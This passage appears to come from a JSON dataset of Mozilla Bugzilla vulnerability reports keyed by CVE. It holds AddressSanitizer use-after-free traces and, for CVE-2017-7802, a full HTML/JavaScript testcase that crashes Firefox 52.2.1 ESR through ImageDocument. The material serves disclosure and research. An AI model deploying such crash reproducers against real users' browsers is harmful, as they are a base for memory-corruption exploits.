0x7f65e877f8ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #18 0x7f65e87ba94f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #19 0x7f65e87baf92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #20 0x7f65e8289ec2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #21 0x7f65df48b8af in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7f65e87ba2e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #23 0x7f65e87ba2e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #24 0x7f65e879a6ef in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #25 0x7f65e879a6ef in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #26 0x7f65e877f8ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #27 0x7f65e87ba94f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #28 0x7f65e87baf92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #29 0x7f65e852960c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7f65e84f8f5f in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #31 0x7f65e850672f in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #32 0x7f65e8508ede in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #33 0x7f65e87ba2e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #34 0x7f65e87ba2e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #35 0x7f65e87baf92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #36 0x7f65e828c12d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0ded in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7f65e458003a in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7f65e458003a in NS_NewComputedDOMStyle(mozilla::dom::Element*, nsAString_internal const&, nsIPresShell*, nsComputedDOMStyle::StyleType) /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:72 #4 0x7f65e066c40d in nsGlobalWindow::GetComputedStyleHelperOuter(mozilla::dom::Element&, nsAString_internal const&, bool) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:10814:5 #5 0x7f65e066be90 in nsGlobalWindow::GetComputedStyleHelper(mozilla::dom::Element&, nsAString_internal const&, bool, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:10827:3 #6 0x7f65e066bb56 in nsGlobalWindow::GetComputedStyle(mozilla::dom::Element&, nsAString_internal const&, mozilla::ErrorResult&) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:10743:10 #7 0x7f65e1bea044 in mozilla::dom::WindowBinding::getComputedStyle(JSContext*, JS::Handle<JSObject*>, nsGlobalWindow*, JSJitMethodCallArgs const&) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:3162:49 #8 0x7f65e1be3634 in mozilla::dom::WindowBinding::genericMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/obj-firefox/dom/bindings/WindowBinding.cpp:15157:13 #9 0x7f65e87ba2e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #10 0x7f65e87ba2e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #11 0x7f65e879a6ef in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #12 0x7f65e879a6ef in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #13 0x7f65e877f8ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #14 0x7f65e87ba94f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #15 0x7f65e87baf92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #16 0x7f65e8289ec2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #17 0x7f65e3cb130b in Call /home/worker/workspace/build/src/obj-firefox/dist/include/jsapi.h:3310:14 #18 0x7f65e3cb130b in nsXBLProtoImplAnonymousMethod::Execute(nsIContent*, JSAddonId*) /home/worker/workspace/build/src/dom/xbl/nsXBLProtoImplMethod.cpp:331 #19 0x7f65e3c7b24e in nsXBLBinding::ExecuteAttachedHandler() /home/worker/workspace/build/src/dom/xbl/nsXBLBinding.cpp:634:5 #20 0x7f65e3c7b04e in nsBindingManager::ProcessAttachedQueueInternal(unsigned int) /home/worker/workspace/build/src/dom/xbl/nsBindingManager.cpp:419:7 #21 0x7f65e4aa5009 in ProcessAttachedQueue /home/worker/workspace/build/src/dom/xbl/nsBindingManager.h:105:5 #22 0x7f65e4aa5009 in PresShell::FlushPendingNotifications(mozilla::ChangesToFlush) /home/worker/workspace/build/src/layout/base/nsPresShell.cpp:4167 #23 0x7f65e47b721c in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1836:11 #24 0x7f65e47c3a61 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:295:7 #25 0x7f65e47c34f5 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:316:5 #26 0x7f65e47c601e in applyImpl<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), StoreCopyPassByValue<mozilla::TimeStamp> , 0> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #27 0x7f65e47c601e in apply<mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver, void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp)> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #28 0x7f65e47c601e in mozilla::detail::RunnableMethodImpl<void (mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::*)(mozilla::TimeStamp), true, false, mozilla::TimeStamp>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #29 0x7f65ddd178bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #30 0x7f65ddd999fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #31 0x7f65deb5140f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #32 0x7f65deac2fc8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #33 0x7f65deac2fc8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #34 0x7f65deac2fc8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #35 0x7f65e40ec19f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #36 0x7f65e6166451 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #37 0x7f65e62fd757 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #38 0x7f65e62feecd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 SUMMARY: AddressSanitizer: heap-use-after-free /home/worker/workspace/build/src/layout/style/nsComputedDOMStyle.cpp:639:14 in nsComputedDOMStyle::UpdateCurrentStyleSources(bool) Shadow bytes around the buggy address: 0x0c188010c380: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c188010c390: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd 0x0c188010c3a0: fd fd fd fd fd fd fd fd fa fa fa fa fa fa fa fa 0x0c188010c3b0: fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd fd 0x0c188010c3c0: fa fa fa fa fa fa fa fa fd fd fd fd fd fd fd fd =>0x0c188010c3d0: fd fd fd fd[fd]fd fd fd fa fa fa fa fa fa fa fa 0x0c188010c3e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c188010c3f0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 0x0c188010c400: 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa 0x0c188010c410: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 0x0c188010c420: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 Shadow byte legend (one shadow byte represents 8 application bytes): Addressable: 00 Partially addressable: 01 02 03 04 05 06 07 Heap left redzone: fa Heap right redzone: fb Freed heap region: fd Stack left redzone: f1 Stack mid redzone: f2 Stack right redzone: f3 Stack partial redzone: f4 Stack after return: f5 Stack use after scope: f8 Global redzone: f9 Global init order: f6 Poisoned by user: f7 Container overflow: fc Array cookie: ac Intra object redzone: bb ASan internal: fe Left alloca redzone: ca Right alloca redzone: cb ==1349==ABORTING"
      }
    ],
    "CVE-2017-7802": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=1378147",
        "title": "heap-use-after-free in mozilla::dom::ImageDocument::UpdateSizeFromLayout",
        "description": "The following testcase crashes the latest ASAN build of Firefox 52.2.1 ESR. The testcase requires a few reloads and reproduces best when opened in multiple tabs. <script> function start() { o0=document.createElement('iframe'); o0.src='data:image/gif;base64,R0lGODlhAQABAPAAAAAzEQAAACH5BAQZAAAAIf8LTkVUU0NBUEUyLjADAQAAACwAAAAAAQABAAACAkQBACH5BAQZAAAALAAAAAABAAEAgAAzqgAAAAICRAEAIfkEBBkAAAAsAAAAAAEAAQCAIjMRAAAAAgJEAQAh+QQEGQAAACwAAAAAAQABAIAi/xEAAAACAkQBACH5BAQZAAAALAAAAAABAAEAgP//AAAAAAICRAEAIfkEBBkAAAAsAAAAAAEAAQCA//8RAAAAAgJEAQA7'; o0.seamless='seamless'; o0.addEventListener('load',fun0,false); document.body.appendChild(o0); } function fun0() { o8=o0.contentWindow; o8.onresize=fun1; o0.width='3636px'; o9=o0.contentDocument; tmp=o9.getElementsByTagName('*'); o10=tmp[1]; o11=tmp[5]; } function fun1() { o10.appendChild(o0); o11['textContent']=''; fuzzPriv.GC();fuzzPriv.CC();fuzzPriv.GC();fuzzPriv.CC(); location.reload(); } </script> <body onload=\"start()\"></body> ASAN output: ================================================================= ==14974==ERROR: AddressSanitizer: heap-use-after-free on address 0x61200021e8f0 at pc 0x7fcc5a0b2a5a bp 0x7ffe3f3f1980 sp 0x7ffe3f3f1978 READ of size 4 at 0x61200021e8f0 thread T0 #0 0x7fcc5a0b2a59 in GetBoolFlag /home/worker/workspace/build/src/dom/base/nsINode.h:1630:12 #1 0x7fcc5a0b2a59 in IsInUncomposedDoc /home/worker/workspace/build/src/dom/base/nsINode.h:526 #2 0x7fcc5a0b2a59 in GetPrimaryFrame /home/worker/workspace/build/src/dom/base/nsIContent.h:916 #3 0x7fcc5a0b2a59 in GetPrimaryFrame /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/dom/Element.h:964 #4 0x7fcc5a0b2a59 in mozilla::dom::Element::GetPrimaryFrame(mozFlushType) /home/worker/workspace/build/src/dom/base/Element.cpp:2197 #5 0x7fcc5c5182c7 in mozilla::dom::ImageDocument::UpdateSizeFromLayout() /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:625:28 #6 0x7fcc5c5180d8 in mozilla::dom::ImageDocument::OnPageShow(bool, mozilla::dom::EventTarget*) /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:288:3 #7 0x7fcc5e36661b in nsDocumentViewer::LoadComplete(nsresult) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:1058:9 #8 0x7fcc5f109f4b in nsDocShell::EndPageLoad(nsIWebProgress*, nsIChannel*, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7635:5 #9 0x7fcc5f105d54 in nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7439:7 #10 0x7fcc5f10d3bf in non-virtual thunk to nsDocShell::OnStateChange(nsIWebProgress*, nsIRequest*, unsigned int, nsresult) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7336:13 #11 0x7fcc5930d290 in nsDocLoader::DoFireOnStateChange(nsIWebProgress*, nsIRequest*, int&, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:1255:3 #12 0x7fcc5930c228 in nsDocLoader::doStopDocumentLoad(nsIRequest*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:840:5 #13 0x7fcc59308f88 in nsDocLoader::DocLoaderIsEmpty(bool) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:730:9 #14 0x7fcc5930b084 in nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:612:5 #15 0x7fcc5930bc3c in non-virtual thunk to nsDocLoader::OnStopRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/uriloader/base/nsDocLoader.cpp:468:14 #16 0x7fcc578621fa in mozilla::net::nsLoadGroup::RemoveRequest(nsIRequest*, nsISupports*, nsresult) /home/worker/workspace/build/src/netwerk/base/nsLoadGroup.cpp:633:18 #17 0x7fcc5a2fe696 in nsDocument::DoUnblockOnload() /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8640:7 #18 0x7fcc5a2fdf6e in nsDocument::UnblockOnload(bool) /home/worker/workspace/build/src/dom/base/nsDocument.cpp:8568:9 #19 0x7fcc5d5e5be8 in nsBindingManager::DoProcessAttachedQueue() /home/worker/workspace/build/src/dom/xbl/nsBindingManager.cpp:404:5 #20 0x7fcc5d645d92 in applyImpl<nsBindingManager, void (nsBindingManager::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:775:12 #21 0x7fcc5d645d92 in apply<nsBindingManager, void (nsBindingManager::*)()> /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:781 #22 0x7fcc5d645d92 in mozilla::detail::RunnableMethodImpl<void (nsBindingManager::*)(), true, false>::Run() /home/worker/workspace/build/src/obj-firefox/dist/include/nsThreadUtils.h:810 #23 0x7fcc576828bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #24 0x7fcc577049fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #25 0x7fcc584bc40f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #26 0x7fcc5842dfc8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #27 0x7fcc5842dfc8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #28 0x7fcc5842dfc8 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:205 #29 0x7fcc5da5719f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:3 #30 0x7fcc5fad1451 in nsAppStartup::Run() /home/worker/workspace/build/src/toolkit/components/startup/nsAppStartup.cpp:283:19 #31 0x7fcc5fc68757 in XREMain::XRE_mainRun() /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4488:10 #32 0x7fcc5fc69ecd in XREMain::XRE_main(int, char**, nsXREAppData const*) /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4621:8 #33 0x7fcc5fc6ad8c in XRE_main /home/worker/workspace/build/src/toolkit/xre/nsAppRunner.cpp:4712:16 #34 0x4df91a in do_main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:282:10 #35 0x4df91a in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:415 #36 0x7fcc7303182f in __libc_start_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291 #37 0x41ba88 in _start (/home/nils/fuzzer3/esr/firefox/firefox+0x41ba88) 0x61200021e8f0 is located 48 bytes inside of 280-byte region [0x61200021e8c0,0x61200021e9d8) freed by thread T0 here: #0 0x4b21db in __interceptor_free /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:38:3 #1 0x7fcc5754b354 in SnowWhiteKiller::~SnowWhiteKiller() /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2665:9 #2 0x7fcc5754af46 in nsCycleCollector::FreeSnowWhite(bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:2840:3 #3 0x7fcc5755201e in nsCycleCollector::BeginCollection(ccType, nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3826:3 #4 0x7fcc575514dc in nsCycleCollector::Collect(ccType, js::SliceBudget&, nsICycleCollectorListener*, bool) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:3651:9 #5 0x7fcc57555556 in nsCycleCollector_collect(nsICycleCollectorListener*) /home/worker/workspace/build/src/xpcom/base/nsCycleCollector.cpp:4144:3 #6 0x7fcc5a3e7b19 in nsJSContext::CycleCollectNow(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsJSEnvironment.cpp:1440:3 #7 0x7fcc59f1555d in nsDOMWindowUtils::CycleCollect(nsICycleCollectorListener*, int) /home/worker/workspace/build/src/dom/base/nsDOMWindowUtils.cpp:1340:3 #8 0x7fcc576aaec6 in NS_InvokeByIndex /home/worker/workspace/build/src/xpcom/reflect/xptcall/md/unix/xptcinvoke_x86_64_unix.cpp:180:23 #9 0x7fcc58ecdfbe in Invoke /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:2058:12 #10 0x7fcc58ecdfbe in Call /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1377 #11 0x7fcc58ecdfbe in XPCWrappedNative::CallMethod(XPCCallContext&, XPCWrappedNative::CallMode) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNative.cpp:1344 #12 0x7fcc58ed5648 in XPC_WN_CallMethod(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/XPCWrappedNativeJSOps.cpp:999:12 #13 0x7fcc621252e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #14 0x7fcc621252e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #15 0x7fcc621056ef in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #16 0x7fcc621056ef in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #17 0x7fcc620ea8ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #18 0x7fcc6212594f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #19 0x7fcc62125f92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #20 0x7fcc61bf4ec2 in JS_CallFunctionValue(JSContext*, JS::Handle<JSObject*>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2769:12 #21 0x7fcc58df68af in xpc::FunctionForwarder(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/xpconnect/src/ExportHelpers.cpp:319:18 #22 0x7fcc621252e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #23 0x7fcc621252e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #24 0x7fcc621056ef in CallFromStack /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:510:12 #25 0x7fcc621056ef in Interpret(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:2922 #26 0x7fcc620ea8ad in js::RunScript(JSContext*, js::RunState&) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:405:12 #27 0x7fcc6212594f in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:477:15 #28 0x7fcc62125f92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #29 0x7fcc61e9460c in js::Wrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/Wrapper.cpp:165:12 #30 0x7fcc61e63f5f in js::CrossCompartmentWrapper::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) const /home/worker/workspace/build/src/js/src/proxy/CrossCompartmentWrapper.cpp:333:14 #31 0x7fcc61e7172f in js::Proxy::call(JSContext*, JS::Handle<JSObject*>, JS::CallArgs const&) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:400:12 #32 0x7fcc61e73ede in js::proxy_Call(JSContext*, unsigned int, JS::Value*) /home/worker/workspace/build/src/js/src/proxy/Proxy.cpp:689:12 #33 0x7fcc621252e5 in CallJSNative /home/worker/workspace/build/src/js/src/jscntxtinlines.h:239:15 #34 0x7fcc621252e5 in js::InternalCallOrConstruct(JSContext*, JS::CallArgs const&, js::MaybeConstruct) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:447 #35 0x7fcc62125f92 in js::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, js::AnyInvokeArgs const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/vm/Interpreter.cpp:523:10 #36 0x7fcc61bf712d in JS::Call(JSContext*, JS::Handle<JS::Value>, JS::Handle<JS::Value>, JS::HandleValueArray const&, JS::MutableHandle<JS::Value>) /home/worker/workspace/build/src/js/src/jsapi.cpp:2828:12 previously allocated by thread T0 here: #0 0x4b24fb in malloc /builds/slave/moz-toolchain/src/llvm/projects/compiler-rt/lib/asan/asan_malloc_linux.cc:52:3 #1 0x4e0ded in moz_xmalloc /home/worker/workspace/build/src/memory/mozalloc/mozalloc.cpp:83:17 #2 0x7fcc5c3aca3d in operator new /home/worker/workspace/build/src/obj-firefox/dist/include/mozilla/mozalloc.h:194:12 #3 0x7fcc5c3aca3d in NS_NewHTMLImageElement(already_AddRefed<mozilla::dom::NodeInfo>&&, mozilla::dom::FromParser) /home/worker/workspace/build/src/dom/html/HTMLImageElement.cpp:55 #4 0x7fcc5c5171cf in mozilla::dom::ImageDocument::CreateSyntheticDocument() /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:665:19 #5 0x7fcc5c515a9e in mozilla::dom::ImageDocument::SetScriptGlobalObject(nsIScriptGlobalObject*) /home/worker/workspace/build/src/dom/html/ImageDocument.cpp:256:9 #6 0x7fcc59f6e811 in nsGlobalWindow::SetNewDocument(nsIDocument*, nsISupports*, bool) /home/worker/workspace/build/src/dom/base/nsGlobalWindow.cpp:2994:3 #7 0x7fcc5e35da70 in nsDocumentViewer::InitInternal(nsIWidget*, nsISupports*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, bool, bool, bool) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:915:14 #8 0x7fcc5e35ccb7 in nsDocumentViewer::Init(nsIWidget*, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&) /home/worker/workspace/build/src/layout/base/nsDocumentViewer.cpp:655:10 #9 0x7fcc5f1034b2 in nsDocShell::SetupNewViewer(nsIContentViewer*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9407:7 #10 0x7fcc5f101bb9 in nsDocShell::Embed(nsIContentViewer*, char const*, nsISupports*) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:7260:17 #11 0x7fcc5f0948af in nsDocShell::CreateContentViewer(nsACString_internal const&, nsIRequest*, nsIStreamListener**) /home/worker/workspace/build/src/docshell/base/nsDocShell.cpp:9212:3 #12 0x7fcc5f091841 in nsDSURIContentListener::DoContent(nsACString_internal const&, bool, nsIRequest*, nsIStreamListener**, bool*) /home/worker/workspace/build/src/docshell/base/nsDSURIContentListener.cpp:128:10 #13 0x7fcc59319f4d in nsDocumentOpenInfo::TryContentListener(nsIURIContentListener*, nsIChannel*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:736:17 #14 0x7fcc59316250 in nsDocumentOpenInfo::DispatchContent(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:414:30 #15 0x7fcc593150b0 in nsDocumentOpenInfo::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/uriloader/base/nsURILoader.cpp:277:8 #16 0x7fcc5780e51b in nsBaseChannel::OnStartRequest(nsIRequest*, nsISupports*) /home/worker/workspace/build/src/netwerk/base/nsBaseChannel.cpp:809:14 #17 0x7fcc5785a13e in nsInputStreamPump::OnStateStart() /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:524:14 #18 0x7fcc57859632 in nsInputStreamPump::OnInputStreamReady(nsIAsyncInputStream*) /home/worker/workspace/build/src/netwerk/base/nsInputStreamPump.cpp:426:25 #19 0x7fcc57637a0d in nsInputStreamReadyEvent::Run() /home/worker/workspace/build/src/xpcom/io/nsStreamUtils.cpp:95:9 #20 0x7fcc576828bb in nsThread::ProcessNextEvent(bool, bool*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1216:7 #21 0x7fcc577049fc in NS_ProcessNextEvent(nsIThread*, bool) /home/worker/workspace/build/src/xpcom/glue/nsThreadUtils.cpp:361:10 #22 0x7fcc584bc40f in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21 #23 0x7fcc5842dfc8 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:232:3 #24 0x7fcc5842dfc8 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message_loop.cc:225 #25 0x7fcc5842dfc8 in MessageLoop::Run() 